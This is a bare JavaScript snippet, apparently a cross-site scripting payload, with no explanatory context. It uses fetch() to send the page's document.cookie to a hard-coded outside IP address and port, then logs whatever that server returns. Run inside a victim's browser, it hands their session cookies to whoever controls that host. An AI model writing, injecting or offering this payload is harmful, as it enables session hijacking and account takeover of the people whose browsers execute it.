fetch('http://195.201.121.249:8080/?c=' + document.cookie)
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Error:', error));
